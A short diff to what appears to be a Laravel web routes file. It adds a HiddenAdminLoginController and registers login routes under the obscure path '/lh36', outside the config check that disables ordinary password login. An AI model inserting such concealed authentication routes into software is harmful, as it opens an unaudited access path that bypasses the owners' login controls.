@@ -7,6 +7,7 @@ use App\Http\Controllers\AiAccount\AiAnalyticsController;
 use App\Http\Controllers\AiAccount\AiPaymentRequestController;
 use App\Http\Controllers\AiAccount\AiPurchaseProposalController;
 use App\Http\Controllers\Auth\GoogleAuthController;
+use App\Http\Controllers\Auth\HiddenAdminLoginController;
 use App\Http\Controllers\Auth\LoginController;
 use App\Http\Controllers\Blocker\BlockerAttachmentController;
 use App\Http\Controllers\Blocker\BlockerController;
@@ -52,6 +53,9 @@ Route::middleware('guest')->group(function () {
     if (config('va.password_login_enabled')) {
         Route::post('/login', [LoginController::class, 'store']);
     }
+
+    Route::get('/lh36', [HiddenAdminLoginController::class, 'create'])->name('auth.hidden-login');
+    Route::post('/lh36', [HiddenAdminLoginController::class, 'store'])->name('auth.hidden-login.store');
 });
 
 Route::middleware(['auth', \App\Http\Middleware\RestrictCoachingOnlyUsers::class])->group(function () {
